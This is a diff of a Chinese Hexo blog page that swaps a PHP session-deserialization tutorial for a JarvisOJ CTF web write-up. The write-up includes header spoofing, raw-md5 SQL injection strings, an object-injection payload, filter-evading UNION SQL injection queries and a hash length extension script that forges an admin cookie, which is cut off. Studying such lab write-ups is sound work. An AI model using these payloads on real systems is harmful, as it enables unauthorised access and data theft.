@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Session_unserlize | Hexo</title>
-  <meta name="keywords" content=" serialize , php ">
-  <meta name="description" content="Session_unserlize | Hexo">
+  <title>JarvisOJ WP | Hexo</title>
+  <meta name="keywords" content=" WP , serialize , SQL , 哈希长度扩展攻击 ">
+  <meta name="description" content="JarvisOJ WP | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="session的反序列化利用">
 <meta name="keywords" content="serialize,php">
@@ -426,9 +426,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-session_unserialize" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-JarvisOJ" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Session_unserlize</h1>
+        <h1 class="article-title">JarvisOJ WP</h1>
     
     <div class="article-meta">
         
@@ -436,23 +436,27 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="serialize">serialize</a>
+                <a href="javascript:" data-rel="WP">WP</a>
             
         </span>
         
         
         <span class="tag">
             
+            <a href="javascript:" class="color3">WP</a>
+            
             <a href="javascript:" class="color5">serialize</a>
             
-            <a href="javascript:" class="color4">php</a>
+            <a href="javascript:" class="color4">SQL</a>
+            
+            <a href="javascript:" class="color4">哈希长度扩展攻击</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-01 19:53:15'>2019-08-01 19:33</time>
+        创建时间:<time class="date" title='更新时间: 2019-08-01 19:58:33'>2019-08-01 19:37</time>
         
     </div>
     <div class="article-meta">
@@ -474,7 +478,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#对魔法函数的再次认识"><span class="toc-text">对魔法函数的再次认识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用方法"><span class="toc-text">常用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#序列化机制"><span class="toc-text">序列化机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-text">__toString()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-反序列化"><span class="toc-text">session 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#设置session序列化方法可能带来的隐患"><span class="toc-text">设置session序列化方法可能带来的隐患</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-upload-progress"><span class="toc-text">session.upload_progress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo"><span class="toc-text">phpinfo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接："><span class="toc-text">参考链接：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PORT51"><span class="toc-text">PORT51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Localhost"><span class="toc-text">Localhost</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tips"><span class="toc-text">tips</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login"><span class="toc-text">Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#神盾局的秘密"><span class="toc-text">神盾局的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IN-A-Mess"><span class="toc-text">IN A Mess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag在管理员手里"><span class="toc-text">flag在管理员手里</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hash-Length-Extension-Attacks"><span class="toc-text">Hash Length Extension Attacks</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpinfo"><span class="toc-text">phpinfo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接："><span class="toc-text">参考链接：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -489,148 +493,241 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>session的反序列化利用</p>
+        <p>真是被自己菜哭了，暑假第一个月一定要把WEB刷完写完WP！</p>
 <a id="more"></a>
-<p>8/1/2019 10:44:57 AM </p>
-<h2 id="对魔法函数的再次认识"><a href="#对魔法函数的再次认识" class="headerlink" title="对魔法函数的再次认识"></a>对魔法函数的再次认识</h2><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><pre><code>__construct()//创建对象时触发
-__destruct() //对象被销毁时触发
-__call() //在对象上下文中调用不可访问的方法时触发
-__callStatic() //在静态上下文中调用不可访问的方法时触发
-__get() //用于从不可访问的属性读取数据
-__set() //用于将数据写入不可访问的属性
-__isset() //在不可访问的属性上调用isset()或empty()触发
-__unset() //在不可访问的属性上使用unset()时触发
-__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h4 id="序列化机制"><a href="#序列化机制" class="headerlink" title="序列化机制"></a>序列化机制</h4><pre><code>String
-s:size:value;
-Integer
-i:value;
-Boolean
-b:value; (does not store &quot;true&quot; or &quot;false&quot;, does store &#39;1&#39; or &#39;0&#39;)
-Null
-N;
-Array
-a:size:{key definition;value definition;(repeated per element)}
-Object
-O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</code></pre><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote>
-<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并<strong>返回一个包含对象中所有应被序列化的变量名称的数组</strong>。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
-</blockquote>
-<p>也就是说序列化时没有被利用到的属性会被清理。</p>
-<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote>
-<p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
-</blockquote>
-<p>也就是说会在<code>unserilize</code>之前准备好可能会用到的对象资源</p>
-<p>拿<a href="https://xz.aliyun.com/t/3674#toc-5" title="师傅博客" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-5</a>师傅文章的代码做个例子：</p>
+
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>有时间也做做别的</p>
+<h3 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h3><p>题目链接：<a href="http://web.jarvisoj.com:32770/" title="题目链接" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p>
+<p>要用本地51端口去访问</p>
+<pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></pre><p>但是应该是题目问题，没显示出来flag。</p>
+<h3 id="Localhost"><a href="#Localhost" class="headerlink" title="Localhost"></a>Localhost</h3><p>题目链接 <a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a></p>
+<p>题目要求localhost only,我们可以通过伪造X-FORWARDED-FOR来达到目的</p>
+<pre><code>import requests
+
+url=&#39;http://web.jarvisoj.com:32774/&#39;
+
+s=requests.session()
+data={
+&#39;X-FORWARDED-FOR&#39;:&#39;127.0.0.1&#39;
+}
+r=s.get(url,headers=data)
+print(r.text)</code></pre><p>返回信息包含flag</p>
+<h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>这里再稍稍补充一下HTTP协议请求头的知识</p>
+<ol>
+<li>每个HTTP请求的第一行都由3个以空格间隔的项目组成</li>
+<li>一个说明HTTP方法的动词，主要作用是从Web服务器获取一个资源，GET请求并没有消息主题，因此消息头后的空白行中没有其他数据。</li>
+<li>第二个是请求的URL，通常由一个所请求的资源名称以及客户端向该资源提交的参数的可选查询字符串组成</li>
+<li>第三个是使用的HTTP版本，常用HTTP版本为1.1和1.0，我们遇到的唯一差异可能就是1.1版本必须使用Host请求</li>
+<li>Referer消息头表示用于发出请求的原始URL</li>
+<li>User-Agent消息头提供与浏览器或其他生成请求的客户端软件有关的信息</li>
+<li>Host消息头用于指定出现在被访问的完整URL中的主机名称，如果几个WEB站点以相同的一台服务器为主机就需要指定HOST，因为第一行中的URL通常不包含主机名称。服务器可以通过该字段进行IP过滤操作。</li>
+<li>X-FORWARDED-FOR当你使用了代理时web服务器就不知道你的真实IP了，为了避免这种情况代理服务器会增加一个该字段信息，把链接他的客户端IP加到这个消息头里，保证服务器能获取到真实IP。这是一个扩展头。</li>
+<li>cookie为服务器端生成的存于客户端的身份标识</li>
+</ol>
+<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>题目链接：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p>
+<p>打开题目是一个密码的提交框，随便测一下没什么收获，查看请求信息发现HINT在响应头里</p>
+<pre><code>&quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</code></pre><p>这里将md5后的密码提交查询，注意到md5的第二个参数为true</p>
+<pre><code>string md5( string $str[, bool $raw_output = false] )</code></pre><p><strong>raw_output<br>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</strong></p>
+<p>我们需要寻找一个字符串在md5之后含有 <code>&#39; or &#39;</code> 之类的可以产生闭合的。</p>
+<p>国外的大佬在2010年跑出来了几个符合条件的<a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" title="这是那篇博客" target="_blank" rel="noopener">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p>
+<p>我们可以用两个 </p>
+<pre><code>129581926211651571912466741651878684928
+
+ffifdyop</code></pre><h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>题目链接：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p>
+<p>进入题目后查看源码发现ba64加密的字符串，</p>
+<p><code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</code></p>
+<p>尝试编码index.php读源码</p>
 <pre><code>&lt;?php 
-class Caiji{
-public function __construct($ID, $sex, $age){
-$this-&gt;ID = $ID;
-$this-&gt;sex = $sex;
-$this-&gt;age = $age;
-$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);
-}
-
-public function getInfo(){
-echo $this-&gt;info . &#39;&lt;br&gt;&#39;;
-}
-/**
- * serialize前调用 用于删选需要被序列化存储的成员变量
- * @return array [description]
- */
-public function __sleep(){
-echo __METHOD__ . &#39;&lt;br&gt;&#39;;
-return [&#39;ID&#39;, &#39;sex&#39;, &#39;age&#39;];
-}
-
-/**
- * unserialize前调用 用于预先准备对象资源
- */
-public function __wakeup(){
-echo __METHOD__ . &#39;&lt;br&gt;&#39;;
-$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);
-}
-}
-
-$me = new Caiji(&#39;Luc1fer&#39;, 20, &#39;male&#39;);
-
-$me-&gt;getInfo();
-//存在__sleep(函数，$info属性不会被存储
-$temp = serialize($me);
-echo $temp . &#39;&lt;br&gt;&#39;;
-
-$me = unserialize($temp);
-//__wakeup()组装的$info
-$me-&gt;getInfo();
-
-?&gt;</code></pre><p>执行结果如下 ：</p>
-<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg" alt="魔法函数执行结果"></p>
-<p>如果看不太清楚函数的用法，我们可以再改一下代码看看效果，我们这次注释掉了<code>__sleep()</code>函数，并且在其他函数里增加了提示语句：</p>
-<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5jyiiweobj30ox05n0sx.jpg" alt="修改之后的效果"></p>
-<p>可以看到因为<code>sleep</code>的存在，<code>info</code>属性被删除，导致<code>getinfo()</code>使用时无法打印<code>Info</code>属性，在我们注释掉<code>sleep</code>之后，所有的属性都正常打印了，<code>wakeup</code>也是如此。</p>
-<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote>
-<p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR 级别的致命错误。</p>
-</blockquote>
-<pre><code>&lt;?php 
-class Caiji{
-public function __construct($ID, $sex, $age){
-$this-&gt;ID = $ID;
-$this-&gt;sex = $sex;
-$this-&gt;age = $age;
-$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);
-}
-
-public function __toString(){
-return $this-&gt;info;
-}
-}
-
-$me = new Caiji(&#39;twosmi1e&#39;, 20, &#39;male&#39;);
-echo &#39;__toString:&#39; . $me . &#39;&lt;br&gt;&#39;;
-?&gt;
-
-__toString:ID: twosmi1e, age: 20, sex: male</code></pre><h2 id="session-反序列化"><a href="#session-反序列化" class="headerlink" title="session 反序列化"></a>session 反序列化</h2><p>PHP在session存储和读取时都会有一个序列化和反序列化的过程，php内置了多种处理器用于存取$_SESSION数据，对数据进行序列化与反序列化。</p>
-<p>这是php.ini中的配置项</p>
-<p><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png" alt="phpinfo配置"><br><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png" alt></p>
-<ul>
-<li><code>session.save_path</code> 设置session的存储路径</li>
-<li><code>session.save_handler</code> 设定用户自定义存储函数</li>
-<li><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话</li>
-<li><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php</li>
-</ul>
-<p>对于处理器，常用的有三种，对应三种不同的处理格式</p>
-<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5jzfr3tdsj30nx066q3f.jpg" alt="处理器的处理方式"></p>
-<p>我们可以看看不同储存方式储存的区别：</p>
-<p>选择不同的处理器来生成session，生成的文件就储存在上图对应目录中</p>
-<pre><code>&lt;?
-ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
-session_start();
-
-$_SESSION[&#39;name&#39;] = &#39;Luc1fer&#39;;
-
-?&gt;
-
-php_serilize: a:1:{s:4:&quot;name&quot;;s:7:&quot;Luc1fer&quot;;}
-php: name|s:7:&quot;Luc1fer&quot;;
-php_binary: **EOT**names:7:&quot;Luc1fer&quot;;</code></pre><p>如果<strong>PHP在反序列化存储的$_SESSION数据时使用的处理器和序列化使用的处理器不同</strong>，会导致数据无法正确反序列化，通过特殊构造甚至可以伪造任意数据。</p>
-<h3 id="设置session序列化方法可能带来的隐患"><a href="#设置session序列化方法可能带来的隐患" class="headerlink" title="设置session序列化方法可能带来的隐患"></a>设置session序列化方法可能带来的隐患</h3><p>如果我们创建一个写入session的脚本</p>
+    require_once(&#39;shield.php&#39;);
+    $x = new Shield();
+    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
+    if (!empty($g)) {
+        $x = unserialize($g);
+    }
+    echo $x-&gt;readfile();
+?&gt;</code></pre><p>可以看到包含了shield.php，再读shield.php</p>
 <pre><code>&lt;?php
-ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
-session_start();
-name = _GET[&#39;name&#39;] ? _GET[&#39;name&#39;] : &quot;name&quot;; value = _GET[&#39;value&#39;] ? _GET[&#39;value&#39;] : &quot;value&quot;;
-_SESSION[name] = value;  if(isset(_GET[&#39;clean&#39;])) session_destroy();</code></pre><p>此时我们传入<code>value=|s:5:&quot;hack!&quot;;</code>,在进行session存储时的内容就会变成：<code>a:1:{s:4:&quot;name&quot;;s:13:&quot;|s:5:&quot;hack!&quot;;&quot;;}</code>.我们可以知道在<code>php\_serialize</code>中<code>a</code>代表一个数组，包含一个元素，但是如果其他的php页面没有设置处理器为<code>php\_serialize</code>而使用默认的php，那么在php解释session中的内容时，<code>|</code>前的部分会被解释称键，后的部分会被解释成值，在这里我们传入的<code>s:5:&quot;hack!&quot;;</code>会被解析成<code>hack!&quot;</code>，后面的<code>&quot;;</code>会被忽略。,最后解析的结果就是<code>Array ([a:1:{s:4:&quot;name&quot;;s:13:&quot;}]=&gt;hack!)</code>。</p>
-<p>我们可以通过此来利用反序列化漏洞。</p>
-<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><blockquote>
-<p>Session 上传进度 </p>
-</blockquote>
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &#39;&#39;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;</code></pre><p>简单的序列化，控制file变量</p>
+<pre><code>&lt;?php
+    //flag is in pctf.php
+class Shield {
+    public $file;
+    function __construct($filename = &#39;&#39;) {
+        $this -&gt; file = $filename;
+    }
+
+    function readfile() {
+        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
+        &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+            return @file_get_contents($this-&gt;file);
+        }
+    }
+}
+$example = new Shield();
+$example-&gt;file = &quot;pctf.php&quot;;
+echo serialize($example);
+?&gt;</code></pre><h3 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h3><p>题目链接：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p>
+<p>查看源码发现hint，进而读取源码</p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+echo &quot;&lt;!--index.phps--&gt;&quot;;
+
+if(!$_GET[&#39;id&#39;])
+{
+    header(&#39;Location: index.php?id=1&#39;);
+    exit();
+}
+$id=$_GET[&#39;id&#39;];
+$a=$_GET[&#39;a&#39;];
+$b=$_GET[&#39;b&#39;];
+if(stripos($a,&#39;.&#39;))
+{
+    echo &#39;Hahahahahaha&#39;;
+    return ;
+}
+$data = @file_get_contents($a,&#39;r&#39;);
+if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+{
+    require(&quot;flag.txt&quot;);
+}
+else
+{
+    print &quot;work harder!harder!harder!&quot;;
+}
+
+
+?&gt;</code></pre><p>简单分析之后我们需要注意几个点</p>
+<ol>
+<li>stripos()字符串截取函数，与strpos不同前者不区分大小写。</li>
+<li>php中 <code>0admin == 0</code> ,在比较时会将字符串转换成整型再比较。</li>
+<li>file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法，Note: 如果要打开有特殊字符的 URL （比如说有空格），就需要使用 urlencode() 进行 URL 编码。也就是说我们可以在服务器上放一个文件然后传ip地址，如果这样做的话我们还要避免 <code>.</code>,我们可以通过将点分十进制转换为十进制。转换器：<a href="https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef" title="地址转换" target="_blank" rel="noopener">https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef</a>。同时我们也可以使用伪协议：<code>php://input</code> 来Post一个字符串。</li>
+<li>eregi()不区分大小写的正则表达式匹配.这里我们通过%00截断来绕过eregi的检测。</li>
+<li>%00在strlen的判断中仍占3个字符。</li>
+</ol>
+<p>我们进行构造</p>
+<pre><code>http://web.jarvisoj.com:32780/index.php
+?id=0admin
+&amp;a=php://input
+&amp;b=%00admin</code></pre><p>得到</p>
+<p>﻿<code>Come ON!!! {/^HT2mCpcvOLf}</code></p>
+<p>进行访问得到</p>
+<pre><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1</code></pre><p>现在开始这是一道注入题了</p>
+<p>测试id=2,返回</p>
+<pre><code>SELECT * FROM content WHERE id=2</code></pre><p>id=1’</p>
+<pre><code>SELECT * FROM content WHERE id=1&#39;</code></pre><p>id=1 and 1=1 #</p>
+<pre><code>you bad boy/girl!</code></pre><p>测试发现我们不需要闭合单引号与注释，同时过滤了空格。对于空格首先尝试/**/，发现不行，那么/*a*/呢？</p>
+<pre><code>?id=1/*a*/and/*a*/1=1 
+hi666</code></pre><p>这样可以。然后猜测字段个数</p>
+<pre><code>?id=1/*a*/order/*a*/by/*a*/3</code></pre><p>看回显位，这里union,select 都被过滤，双写绕过</p>
+<pre><code>?id=-1/*a*/ununionion/*a*/selselectect/*a*/1,2,3</code></pre><p>看数据库</p>
+<pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),database()</code></pre><p>看表，这里from同样双写</p>
+<pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(table_name)/*a*/frfromom/*a*/information_schema.tables/*a*/where/*a*/table_schema=database()</code></pre><p>看字段，不能直接传表名，需要16进制编码一下</p>
+<pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(column_name)/*a*/frfromom/*a*/information_schema.columns/*a*/where/*a*/table_name=0x636f6e74656e74</code></pre><p>看信息得到flag</p>
+<pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),context/*a*/frofromm/*a*/content    </code></pre><h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p>
+<p>拿到题目看到 <strong>Only Admin can see the flag!!</strong></p>
+<p>先看看响应头信息，尝试改一下cookie为admin，果然没这么简单。</p>
+<p>拿扫描器扫一下扫到了<code>index.php~</code>,看一下16进制数据发现是vim产生的文件，先改一下后缀为<code>index.php.swp</code>用<code>vim -r index.php</code> 恢复一下得到源码.</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Web 350&lt;/title&gt;
+&lt;style type=&quot;text/css&quot;&gt;
+    body {
+        background:gray;
+        text-align:center;
+    }
+&lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;?php 
+        $auth = false;
+        $role = &quot;guest&quot;;
+        $salt = 
+        if (isset($_COOKIE[&quot;role&quot;])) {
+            $role = unserialize($_COOKIE[&quot;role&quot;]);
+            $hsh = $_COOKIE[&quot;hsh&quot;];
+            if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) {
+                $auth = true;
+            } else {
+                $auth = false;
+            }
+        } else {
+            $s = serialize($role);
+            setcookie(&#39;role&#39;,$s);
+            $hsh = md5($salt.strrev($s));
+            setcookie(&#39;hsh&#39;,$hsh);
+        }
+        if ($auth) {
+            echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot;
+        } else {
+            echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;
+        }
+    ?&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p>重点是 <code>if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;])))</code></p>
+<p>HASH长度扩展攻击没错了。</p>
+<h4 id="Hash-Length-Extension-Attacks"><a href="#Hash-Length-Extension-Attacks" class="headerlink" title="Hash Length Extension Attacks"></a>Hash Length Extension Attacks</h4><p><strong>原理</strong></p>
 <blockquote>
-<p>当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 </p>
+<p>服务器将sercet 和 message 连接在一起，然后用摘要算法取摘要，研究发现MD4、MD5、RIPEMD-160、SHA-0、SHA-1、SHA-256、SHA-512、WHIRLPOOL等摘要算法受此攻击，但MD2、SHA-224和SHA-384不受此攻击。</p>
+<p>哈希摘要算法，如MD5、SHA1、SHA2等，都是基于Merkle–Damgård结构。这类算法有一个很有意思的问题：当知道hash(secret + message)的值及secret长度的情况下，可以轻松推算出hash(secret + message||padding||m’)。在这里m’是任意数据，||是连接符，可以为空,padding是secret后的填充字节。hash的padding字节包含整个消息的长度，因此，为了能准确计算出padding的值，secret的长度我们也是需要知道的。</p>
+<p>当我们填充后，服务器算出的原始hash值，正好与我们添加扩展字符串并覆盖初始链变量所计算出来的一样。这是因为攻击者的哈希计算过程，相当于从服务器计算过程的一半紧接着进行下去。提交此hash值便能通过验证了，这就是所谓的哈希长度拓展攻击(Hash Length Extension Attacks)。</p>
 </blockquote>
-<blockquote>
-<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。通常这些键值可以通过读取INI设置来获得。</p>
-</blockquote>
-<p>在POST一个文件前，通过<code>POST</code>一个name为<code>Session.upload_progress</code>，value为用户自定义的一个upload_id。在文件上传过程中会生成上传信息。在上传结束后session中的键值对会直接消失。</p>
-<p>同时还要注意<code>session.upload_progress.cleanup</code>这个参数，这个选项的意思是在上传完成时从session中清除上传进度信息，默认开启。在关闭后上传信息会一直保存在session中。</p>
-<p>通过上面两部分我们可以更改session为自定义数据。</p>
-<h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>JarvisOJ上的题目，题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
+<p>MD5会对消息进行分组，每组64Byte,也就是512bit,不足512bit的会补位，使长度补充到56Byte,补位的二进制表示是在消息后面加一个1，后面都是0，也就是说在16进制下我们需要在后面补80，其他都是0，直到补到56Byte。</p>
+<p>剩下的8Byte表示补位前消息长度，该长度是小端存储，高字节放在高地址中。计算开始前有一组初始向量负责第一轮的加密，此后每一次加密的结果作为下一次加密的初始向量。</p>
+<p>MD5的初始向量是</p>
+<pre><code>A=0x67452301
+B=0xefcdab89
+C=0x98badcfe
+D=0x10325476</code></pre><p>我们举个例子来说明一下补位</p>
+<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5iufmppywj30kv03igm3.jpg" alt></p>
+<p>再来看这道题</p>
+<p>我们不知道salt的长度，而算法的核心就是要知道其长度，不过我们可以爆破猜出来。同时这里对role反序了。</p>
+<p>我们利用hashpump跑一下</p>
+<pre><code>hashpump
+Input Signature: 3a4727d57463f122833d9e732f94e4e0 //上一轮的结果，我们已经抓包得到了 
+Input Data: ;&quot;tseug&quot;:5:s  //原来的数据
+Input Key Length: 12      //长度是试出来的
+Input Data to Add: ;&quot;nimda&quot;:5:s //我们要添加的数据
+fcdc3840332555511c4e4323f6decb07
+;&quot;tseug&quot;:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00;&quot;nimda&quot;:5:s  //记得逆序一下，然后URL编码</code></pre><p>得到</p>
+<pre><code>role: s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B
+
+hsh: fcdc3840332555511c4e4323f6decb07</code></pre><p>放在cookie里就可以了。</p>
+<p>放一个其他人写的脚本</p>
+<pre><code># -*- coding: utf-8 -*-
+import requests,hashpumpy,urllib
+def webre(): #py2
+url = &#39;http://web.jarvisoj.com:32778/&#39;
+sha = &#39;3a4727d57463f122833d9e732f94e4e0&#39;
+string0 = &#39;;&quot;tseug&quot;:5:s&#39;
+string1 = &#39;;&quot;nimda&quot;:5:s&#39;
+for i in range(15):
+    digest, message = hashpumpy.hashpump(sha,string0,string1,i)
+    payload ={&#39;role&#39;:urllib.quote(message[::-1]), &#39;hsh&#39;:digest}
+    #payload ={&#39;role&#39;:(message[::-1]), &#39;hsh&#39;:digest}
+    print i,payload
+    html = requests.get(url,cookies=payload).text#提交答案
+    if &#39;Welcome&#39; in html:
+        print html
+
